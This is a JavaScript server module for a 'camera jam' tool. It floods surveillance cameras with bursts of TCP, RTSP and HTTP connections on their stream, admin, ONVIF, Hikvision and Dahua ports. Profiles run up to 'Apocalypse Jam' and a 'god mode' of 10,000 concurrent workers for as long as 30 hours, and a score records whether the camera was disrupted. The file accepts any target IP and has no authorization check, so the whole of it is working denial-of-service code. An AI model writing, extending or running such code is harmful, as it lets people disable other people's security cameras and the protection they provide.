import net from 'net';
import CameraJam from '../models/CameraJam.js';
import { getAppSettings } from '../models/AppSettings.js';
import { getAiLoadChannels } from './loadTestRunner.js';

export const MAX_DURATION_SECONDS = 30 * 3600;
export const MAX_CONCURRENCY = 10000;
export const GOD_MODE_BURST_SIZE = 500;
export const MAX_IN_FLIGHT_CAP = 200000;

export const CAMERA_PORTS = {
  rtsp: 554,
  http: 80,
  httpAlt: 8080,
  https: 443,
  hikvision: 8000,
  dahua: 37777,
  rtspAlt: 8554,
  onvif: 8899,
};

export const JAM_PROFILES = {
  rtsp_flood: {
    label: 'RTSP Flood',
    description: 'Jam port 554 — RTSP stream disruption at ×200 packet burst',
    ports: [554, 8554],
    burstSize: 200,
    timeoutMs: 3000,
    powerTimeoutMs: 1500,
    paths: [],
    tcpOnly: true,
  },
  http_admin_jam: {
    label: 'HTTP Admin Jam',
    description: 'Flood camera web admin panels on ports 80/8080 — ×160 burst',
    ports: [80, 8080, 443],
    burstSize: 160,
    timeoutMs: 4000,
    powerTimeoutMs: 2000,
    paths: ['/', '/index.html', '/login.html', '/doc/page/login.asp', '/cgi-bin/main.cgi'],
    tcpOnly: false,
  },
  onvif_swarm: {
    label: 'ONVIF Swarm',
    description: 'ONVIF discovery & device service packet swarm — ×100 burst',
    ports: [80, 8080, 8899],
    burstSize: 100,
    timeoutMs: 4000,
    powerTimeoutMs: 2000,
    paths: ['/onvif/device_service', '/onvif/device_service?wsdl', '/PSIA/System/status'],
    tcpOnly: false,
  },
  hikvision_jam: {
    label: 'Hikvision Jam',
    description: 'Hikvision SDK port 8000 connection flood — ×250 burst',
    ports: [8000, 80, 554],
    burstSize: 250,
    timeoutMs: 3000,
    powerTimeoutMs: 1500,
    paths: ['/ISAPI/System/status', '/SDK/status'],
    tcpOnly: true,
  },
  dahua_jam: {
    label: 'Dahua Jam',
    description: 'Dahua port 37777 binary protocol flood — ×250 burst',
    ports: [37777, 80, 554],
    burstSize: 250,
    timeoutMs: 3000,
    powerTimeoutMs: 1500,
    paths: ['/cgi-bin/snapshot.cgi', '/cgi-bin/magicBox.cgi'],
    tcpOnly: true,
  },
  multi_port_swarm: {
    label: 'Multi-Port Swarm',
    description: 'All camera ports simultaneously — ×300 burst',
    ports: [554, 80, 8080, 8000, 37777, 8554, 8899, 443],
    burstSize: 300,
    timeoutMs: 2500,
    powerTimeoutMs: 1200,
    paths: ['/', '/onvif/device_service', '/ISAPI/System/status'],
    tcpOnly: false,
  },
  apocalypse_jam: {
    label: 'Apocalypse Jam',
    description: 'Total camera annihilation — all ports, all protocols, ×400 burst',
    ports: [554, 80, 8080, 8000, 37777, 8554, 8899, 443],
    burstSize: 400,
    timeoutMs: 2000,
    powerTimeoutMs: 1000,
    paths: ['/', '/onvif/device_service', '/ISAPI/System/status', '/cgi-bin/snapshot.cgi'],
    tcpOnly: false,
  },
};

const runningTests = new Map();

function jamGrade(score) {
  if (score >= 90) return 'A';
  if (score >= 80) return 'B';
  if (score >= 70) return 'C';
  if (score >= 60) return 'D';
  return 'F';
}

function timelineBucketSize(durationSeconds) {
  if (durationSeconds <= 600) return 1;
  if (durationSeconds <= 3600) return 10;
  if (durationSeconds <= 86400) return 60;
  return 300;
}

export function validateCameraHost(raw) {
  let input = String(raw || '').trim();
  input = input.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
  const host = input.split(':')[0];
  if (!host || !/^[\d.a-zA-Z\-]+$/.test(host)) {
    throw new Error('Enter a valid camera IP or hostname (e.g. 192.168.1.100)');
  }
  return host;
}

export function clampJamConfig(body = {}, godPlan = null) {
  const durationSeconds = Math.min(MAX_DURATION_SECONDS, Math.max(5, Number(body.durationSeconds) || 30));
  const godMode = Boolean(body.godMode || godPlan?.godMode);
  const maxPower = Boolean(body.maxPower || godMode);
  let concurrency;
  let jamProfile;

  if (godMode) {
    concurrency = MAX_CONCURRENCY;
    jamProfile = 'apocalypse_jam';
  } else {
    concurrency = Math.min(MAX_CONCURRENCY, Math.max(1, Number(body.concurrency) || 100));
    jamProfile = JAM_PROFILES[body.jamProfile] ? body.jamProfile : 'rtsp_flood';
  }

  return {
    targetHost: validateCameraHost(body.targetHost),
    durationSeconds,
    concurrency,
    jamProfile,
    godMode,
    maxPower,
    aiProviderChannels: godPlan?.aiProviderChannels || 0,
    aiProvidersUsed: godPlan?.aiProvidersUsed || [],
    burstSize: godMode ? GOD_MODE_BURST_SIZE : JAM_PROFILES[jamProfile].burstSize,
  };
}

export async function resolveCameraJamGodPlan(settings) {
  const channels = getAiLoadChannels(settings);
  return {
    godMode: true,
    aiProviderChannels: channels.length,
    aiProvidersUsed: channels.map((c) => c.id),
    channels,
  };
}

function tcpJamPacket(host, port, timeoutMs, channel) {
  return new Promise((resolve) => {
    const started = performance.now();
    const socket = net.connect({ host, port, timeout: timeoutMs });
    const finish = (ok, error) => {
      const latencyMs = performance.now() - started;
      resolve({
        ok,
        latencyMs,
        port,
        type: 'tcp',
        channel,
        bytes: 64,
        error,
      });
    };

    socket.on('connect', () => {
      try {
        if (port === 554 || port === 8554) {
          socket.write(`OPTIONS rtsp://${host}:${port}/ RTSP/1.0\r\nCSeq: ${Date.now() % 9999}\r\nUser-Agent: VistawinJam/${channel}\r\n\r\n`);
        } else if (port === 37777) {
          socket.write(Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]));
        } else {
          socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\nX-Jam-Channel: ${channel}\r\n\r\n`);
        }
      } catch {
        // ignore
      }
      socket.destroy();
      finish(true, null);
    });

    socket.on('error', (err) => finish(false, err.message || 'Connection refused'));
    socket.setTimeout(timeoutMs, () => {
      socket.destroy();
      finish(false, 'Timeout');
    });
  });
}

async function httpJamPacket(host, port, path, timeoutMs, channel) {
  const started = performance.now();
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  const scheme = port === 443 ? 'https' : 'http';
  const url = `${scheme}://${host}:${port}${path}`;

  try {
    const response = await fetch(url, {
      method: 'GET',
      signal: controller.signal,
      headers: {
        'User-Agent': `VistawinCameraJam/${channel}`,
        'X-Camera-Jam': '1',
        Connection: 'close',
      },
    });
    if (response.body?.cancel) {
      try { await response.body.cancel(); } catch { /* ignore */ }
    }
    return {
      ok: response.ok || response.status > 0,
      latencyMs: performance.now() - started,
      port,
      type: 'http',
      channel,
      bytes: 128,
      error: null,
    };
  } catch (error) {
    return {
      ok: false,
      latencyMs: performance.now() - started,
      port,
      type: 'http',
      channel,
      bytes: 0,
      error: error.name === 'AbortError' ? 'Timeout' : (error.message || 'Network error'),
    };
  } finally {
    clearTimeout(timer);
  }
}

async function fireJamPacket(host, profile, channel, maxPower) {
  const ports = profile.ports;
  const port = ports[Math.floor(Math.random() * ports.length)];
  const timeoutMs = maxPower ? profile.powerTimeoutMs : profile.timeoutMs;
  const useTcp = profile.tcpOnly || Math.random() > 0.4;

  if (useTcp || !profile.paths?.length) {
    return tcpJamPacket(host, port, timeoutMs, channel);
  }

  const path = profile.paths[Math.floor(Math.random() * profile.paths.length)];
  return httpJamPacket(host, port, path, timeoutMs, channel);
}

function createAggregator(durationSeconds) {
  return {
    bucketSize: timelineBucketSize(durationSeconds),
    totalPackets: 0,
    successfulPackets: 0,
    failedPackets: 0,
    latencySum: 0,
    portCounts: {},
    packetTypes: {},
    errorTypes: {},
    channelCounts: {},
    timelineMap: new Map(),
  };
}

function recordPacket(agg, result, elapsedMs) {
  agg.totalPackets += 1;
  if (result.ok) agg.successfulPackets += 1;
  else agg.failedPackets += 1;
  agg.latencySum += result.latencyMs;

  const portKey = String(result.port);
  agg.portCounts[portKey] = (agg.portCounts[portKey] || 0) + 1;
  agg.packetTypes[result.type] = (agg.packetTypes[result.type] || 0) + 1;
  if (result.channel) {
    agg.channelCounts[result.channel] = (agg.channelCounts[result.channel] || 0) + 1;
  }
  if (result.error) {
    agg.errorTypes[result.error] = (agg.errorTypes[result.error] || 0) + 1;
  }

  const sec = Math.floor(elapsedMs / 1000);
  const bucketStart = Math.floor(sec / agg.bucketSize) * agg.bucketSize;
  if (!agg.timelineMap.has(bucketStart)) {
    agg.timelineMap.set(bucketStart, { second: bucketStart, packets: 0, errors: 0, latencySum: 0 });
  }
  const bucket = agg.timelineMap.get(bucketStart);
  bucket.packets += 1;
  bucket.latencySum += result.latencyMs;
  if (!result.ok) bucket.errors += 1;
}

function computeJamScore(agg, durationSeconds, maxPower, godMode) {
  const total = agg.totalPackets;
  const failRate = total ? (agg.failedPackets / total) * 100 : 0;
  const pps = durationSeconds ? total / durationSeconds : 0;
  let score = Math.min(100, Math.round(pps / 50));
  if (failRate > 50) score += 20;
  else if (failRate > 25) score += 10;
  if (maxPower) score += 10;
  if (godMode) score += 15;
  score = Math.max(0, Math.min(100, score));
  return {
    jamScore: score,
    jamGrade: jamGrade(score),
    cameraDisrupted: failRate > 70 && pps > 100,
    cameraDegraded: failRate > 40 || pps > 500,
  };
}

function finalizeReport(agg, durationSeconds, profile, meta) {
  const timeline = Array.from(agg.timelineMap.values())
    .sort((a, b) => a.second - b.second)
    .map((b) => ({
      second: b.second,
      packets: b.packets,
      errors: b.errors,
      avgLatencyMs: b.packets ? Math.round(b.latencySum / b.packets) : 0,
    }));

  let peakPps = 0;
  timeline.forEach((b) => {
    peakPps = Math.max(peakPps, agg.bucketSize ? b.packets / agg.bucketSize : b.packets);
  });

  const total = agg.totalPackets;
  const jam = computeJamScore(agg, durationSeconds, meta.maxPower, meta.godMode);

  return {
    totalPackets: total,
    successfulPackets: agg.successfulPackets,
    failedPackets: agg.failedPackets,
    successRate: total ? Math.round((agg.successfulPackets / total) * 1000) / 10 : 0,
    packetsPerSecond: durationSeconds ? Math.round((total / durationSeconds) * 10) / 10 : 0,
    peakPacketsPerSecond: Math.round(peakPps * 10) / 10,
    avgLatencyMs: total ? Math.round(agg.latencySum / total) : 0,
    portCounts: agg.portCounts,
    packetTypes: agg.packetTypes,
    errorTypes: agg.errorTypes,
    channelCounts: agg.channelCounts,
    portsTargeted: profile.ports,
    timeline,
    timelineBucketSeconds: agg.bucketSize,
    burstSize: meta.burstSize,
    pipelineDepth: meta.pipelineDepth,
    peakInFlight: meta.peakInFlight,
    maxPower: meta.maxPower,
    godMode: meta.godMode,
    aiProviderChannels: meta.aiProviderChannels,
    aiProvidersUsed: meta.aiProvidersUsed,
    effectiveConcurrency: meta.effectiveConcurrency,
    ...jam,
  };
}

function resolvePipelineDepth(test) {
  if (test.godMode) return 10;
  if (test.maxPower) return 6;
  return 2;
}

export async function executeCameraJam(testId) {
  const test = await CameraJam.findById(testId);
  if (!test || test.status !== 'pending') return;

  test.status = 'running';
  test.startedAt = new Date();
  test.errorMessage = '';
  await test.save();

  const abort = { cancelled: false };
  runningTests.set(String(testId), abort);

  const settings = await getAppSettings();
  const channels = test.godMode ? getAiLoadChannels(settings) : [{ id: 'default' }];

  const profile = test.godMode
    ? { ...JAM_PROFILES.apocalypse_jam, burstSize: GOD_MODE_BURST_SIZE, ports: [...JAM_PROFILES.apocalypse_jam.ports] }
    : (JAM_PROFILES[test.jamProfile] || JAM_PROFILES.rtsp_flood);

  const burstSize = test.godMode ? GOD_MODE_BURST_SIZE : profile.burstSize;
  const maxPower = Boolean(test.maxPower || test.godMode);
  const pipelineDepth = resolvePipelineDepth(test);
  const maxInFlight = Math.min(test.concurrency * burstSize * pipelineDepth, MAX_IN_FLIGHT_CAP);

  const agg = createAggregator(test.durationSeconds);
  const startMs = Date.now();
  const endMs = startMs + test.durationSeconds * 1000;
  const flight = { count: 0, peak: 0 };

  const reportMeta = {
    burstSize,
    pipelineDepth,
    maxPower,
    godMode: test.godMode,
    aiProviderChannels: test.godMode ? channels.length : 0,
    aiProvidersUsed: test.godMode ? channels.map((c) => c.id) : [],
    effectiveConcurrency: test.concurrency,
    peakInFlight: 0,
  };

  function launchPacket(channel) {
    flight.count += 1;
    flight.peak = Math.max(flight.peak, flight.count);
    const elapsed = Date.now() - startMs;
    fireJamPacket(test.targetHost, profile, channel, maxPower)
      .then((r) => recordPacket(agg, r, elapsed))
      .catch(() => recordPacket(agg, { ok: false, latencyMs: 0, port: 0, type: 'tcp', channel, error: 'Launch error' }, elapsed))
      .finally(() => { flight.count -= 1; });
  }

  async function worker(workerIndex) {
    const channel = channels[workerIndex % channels.length]?.id || 'default';
    while (Date.now() < endMs && !abort.cancelled) {
      if (maxPower) {
        for (let i = 0; i < burstSize && flight.count < maxInFlight; i += 1) {
          launchPacket(channel);
        }
        await new Promise((r) => setImmediate(r));
      } else {
        const batch = [];
        for (let i = 0; i < burstSize; i += 1) {
          batch.push(fireJamPacket(test.targetHost, profile, channel, maxPower));
        }
        const results = await Promise.all(batch);
        const elapsed = Date.now() - startMs;
        results.forEach((r) => recordPacket(agg, r, elapsed));
      }
    }
  }

  try {
    await Promise.all(Array.from({ length: test.concurrency }, (_, i) => worker(i)));

    const drainDeadline = Date.now() + 15000;
    while (flight.count > 0 && Date.now() < drainDeadline) {
      await new Promise((r) => setTimeout(r, 100));
    }

    reportMeta.peakInFlight = flight.peak;
    const elapsedSec = Math.max(1, Math.ceil((Date.now() - startMs) / 1000));

    if (abort.cancelled) {
      test.status = 'cancelled';
      if (agg.totalPackets > 0) {
        test.report = finalizeReport(agg, elapsedSec, profile, reportMeta);
      }
    } else {
      test.status = 'completed';
      test.report = finalizeReport(agg, test.durationSeconds, profile, reportMeta);
    }
  } catch (error) {
    test.status = 'failed';
    test.errorMessage = error.message || 'Camera jam failed';
  } finally {
    test.finishedAt = new Date();
    await test.save();
    runningTests.delete(String(testId));
  }
}

export function cancelCameraJam(testId) {
  const abort = runningTests.get(String(testId));
  if (abort) abort.cancelled = true;
}

export function getJamProfilesMeta() {
  return Object.entries(JAM_PROFILES).map(([id, p]) => ({
    id,
    label: p.label,
    description: p.description,
    ports: p.ports,
    burstSize: p.burstSize,
  }));
}
